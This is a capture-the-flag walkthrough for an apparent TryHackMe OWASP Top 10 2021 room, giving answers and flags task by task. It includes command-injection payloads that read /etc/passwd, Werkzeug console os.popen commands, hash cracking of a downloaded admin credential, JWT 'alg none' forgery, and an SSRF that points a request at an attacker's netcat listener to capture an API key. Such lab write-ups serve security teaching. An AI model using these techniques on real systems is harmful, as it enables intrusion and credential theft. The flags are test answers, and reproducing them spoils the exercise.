# OWASP Top 10 - 2021

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/3b2f3af8e836785fe698356264efbb55.png" width="128px" />

## Task 1 - Introduction

> Read the above.

No answer needed

## Task 2 - Accessing Machines

> Connect to our network or deploy the AttackBox.

No answer needed

## Task 3 - 1. Broken Access Control

> Read and understand what broken access control is.

No answer needed

## Task 4 - Broken Access Control (IDOR Challenge)

> Read and understand how IDOR works.

No answer needed

> Deploy the machine and go to URL - Login with the username noot and the password test1234.

No answer needed

> Look at other users' notes. What is the flag?

flag{fivefourthree}

There is an IDOR vuln in the note id. New notes start from 3. It is possible to read also note 1 and note 2.

## Task 5 - 2. Cryptographic Failures

> Read the introduction to Cryptographic Failures and deploy the machine.

No answer needed

## Task 6 - Cryptographic Failures (Supporting Material 1)

> Read and understand the supporting material on SQLite Databases.

No answer needed

## Task 7 - Cryptographic Failures (Supporting Material 2)

> Read the supporting material about cracking hashes.

No answer needed

## Task 8 - Cryptographic Failures (Challenge)

> What is the name of the mentioned directory?

/assets

By looking to the image in the homepage it is possible to identify a path traversal vulnerability over the `/assets` path.

<Image src={require("./assets/owasp-top-10-2021/assets.png").default} />

> Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

webapp.db

Inside the `/assets` folder there is a sqlite db that can be downloaded.

> Use the supporting material to access the sensitive data. What is the password hash of the admin user?

6eea9b7ef19179a06954edd0f6c05ceb

To get the password of the admin user it is enough to open the database using sqlite3 cli tool.

Be careful, the password hash is in the third column not the first.

```bash
sqlite3 webapp.db
.tables
PRAGMA table_info(users);
SELECT * from users;
```

<Image src={require("./assets/owasp-top-10-2021/sqlite.png").default} />

> Crack the hash.
> What is the admin's plaintext password?

qwertyuiop

To decrypt the hash it is possible to use [https://crackstation.net/](https://crackstation.net/).

<Image src={require("./assets/owasp-top-10-2021/crackstation.png").default} />

> Log in as the admin. What is the flag?

THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

<Image src={require("./assets/owasp-top-10-2021/admin.png").default} />

## Task 9 - 3. Injection

> I've understood Injection attacks.

No answer needed

## Task 10 - 3.1. Command Injection

> What strange text file is in the website's root directory?

drpepper.txt

Run `$(ls)` to show the files.

<Image src={require("./assets/owasp-top-10-2021/ls.png").default} />

> How many non-root/non-service/non-daemon users are there?

0

Run `$(id)` to show user information for the current user. The users required must have id greater than 1000.

<Image src={require("./assets/owasp-top-10-2021/id.png").default} />

> What user is this app running as?

apache

Run `$(whoami)` to find who is running the app.

<Image src={require("./assets/owasp-top-10-2021/whoami.png").default} />

> What is the user's shell set as?

/sbin/nologin

Run `$(cat /etc/passwd | grep apache)` to find the shell as the last part of the line.

<Image src={require("./assets/owasp-top-10-2021/shell.png").default} />

> What version of Alpine Linux is running?

3.16.0

Run `$(cat /etc/alpine-release)` to find the version of Alpine that the app is running.

<Image src={require("./assets/owasp-top-10-2021/version.png").default} />

## Task 11 - 4. Insecure Design

> Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.

No answer needed

> What is the value of the flag in joseph's account?

THM{Not_3ven_c4tz_c0uld_sav3_U!}

The reset password is based on three security questions. One of them asks about the favorite color. It is easy to try common english color names to find the answer `green`.

<Image src={require("./assets/owasp-top-10-2021/reset_password.png").default} />

## Task 12 - 5. Security Misconfiguration

> Navigate to http://10.10.2.211:86/console to access the Werkzeug console.
> What is the database file name (the one with the .db extension) in the current directory?

todo.db

Use the given command to see the content of the current directory.

```
import os; print(os.popen("ls -l").read())
```

<Image src={require("./assets/owasp-top-10-2021/werkzeug_db.png").default} />

> Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?

THM{Just_a_tiny_misconfiguration}

Change the given code to read the app.py file using the cat command.

```
import os; print(os.popen("cat app.py").read())
```

<Image src={require("./assets/owasp-top-10-2021/werkzeug_code.png").default} />

## Task 13 - 6. Vulnerable and Outdated Components

> Read about the vulnerability.

No answer needed

## Task 14 - Vulnerable and Outdated Components - Exploit

> Read the above!

No answer needed

## Task 15 - Vulnerable and Outdated Components - Lab

> What is the content of the /opt/flag.txt file?

THM{But_1ts_n0t_my_f4ult!}

Search on Google for `CSE Bookstore vuln` to find a working script on exploit-db.

<Image src={require("./assets/owasp-top-10-2021/cse_vuln.png").default} />

<Image src={require("./assets/owasp-top-10-2021/cse_flag.png").default} />

## Task 16 - 7. Identification and Authentication Failures

> I've understood broken authentication mechanisms.

No answer needed

## Task 17 - Identification and Authentication Failures Practical

> What is the flag that you found in darren's account?

fe86079416a21a3c99937fea8874b667

Register as ` darren` with the additional space at the beginning of the username. Now, try to log in as ` darren` and you will be logged in as `darren`.

<Image src={require("./assets/owasp-top-10-2021/darren_register.png").default} />

<Image src={require("./assets/owasp-top-10-2021/darren.png").default} />

> Now try to do the same trick and see if you can log in as arthur.

No answer needed

> What is the flag that you found in arthur's account?

d9ac0f7db4fda460ac3edeb75d75e16e

Register again as for darren but this time as ` arthur` and log in.

<Image src={require("./assets/owasp-top-10-2021/arthur.png").default} />

## Task 18 - 8. Software and Data Integrity Failures

> Read the above and continue!

No answer needed

## Task 19 - Software Integrity Failures

> What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?

sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=

Go to [https://www.srihash.org/](https://www.srihash.org/) and insert the given text.
Be careful to change the option to `sha256`.

## Task 20 - Data Integrity Failures

> Try logging into the application as guest. What is guest's account password?

guest

If you write a wrong password, a message will appear specifying the default credentials for the guest account.

<Image src={require("./assets/owasp-top-10-2021/cookie.png").default} />

> What is the name of the website's cookie containing a JWT token?

jwt-session

Open the dev tools after the login and look in storage. You should find a cookie with a jwt token.

<Image src={require("./assets/owasp-top-10-2021/jwt.png").default} />

> Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".

No answer needed

> What is the flag presented to the admin user?

THM{Dont_take_cookies_from_strangers}

Use a jwt editor and change alg to none and the username to admin. Be careful to remove the signature but keep the dot.

## Task 21 - 9. Security Logging and Monitoring Failures

> What IP address is the attacker using?

49.99.13.16

The attacker is doing a brute force attack on the login page. You can see the multiple attempts with different usernames.

> What kind of attack is being carried out?

Brute Force

Look the previous answer.

<Image src={require("./assets/owasp-top-10-2021/logs.png").default} />

## Task 22 - 10. Server-Side Request Forgery (SSRF)

> Explore the website. What is the only host allowed to access the admin area?

localhost

<Image src={require("./assets/owasp-top-10-2021/admin-area.png").default} />

> Check the "Download Resume" button. Where does the server parameter point to?

secure-file-storage.com

Go hover the button and you will see the link. Also, you can see the link in the source code or with right click and then copy link address.

```
/download?server=secure-file-storage.com:8087&id=75482342
```

> Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?

THM{Hello_Im_just_an_API_key}

Make your host listen with netcat and then change the link so that it points to your machine.
The flag will be shown in the terminal.

```
/download?server=IP:PORT&id=75482342
```

<Image src={require("./assets/owasp-top-10-2021/nc.png").default} />

> [Optional] There's a way to use SSRF to gain access to the site's admin area. Can you find it?

No answer needed

[Optional] thm{c4n_i_haz_flagz_plz?}

The flag can be obtain by making a SSRF to the admin page by paying attention to the url.

Whatever you put as server will be then updated with additional text at the end.

To avoid this problem add `?x=` at the end of the url to avoid the additional text.

```
/download?server=localhost:PORT/admin?x=&id=75482342
```

<Image src={require("./assets/owasp-top-10-2021/optional-flag.png").default} />

## Task 23 - What Next?

> Read the above!

No answer needed
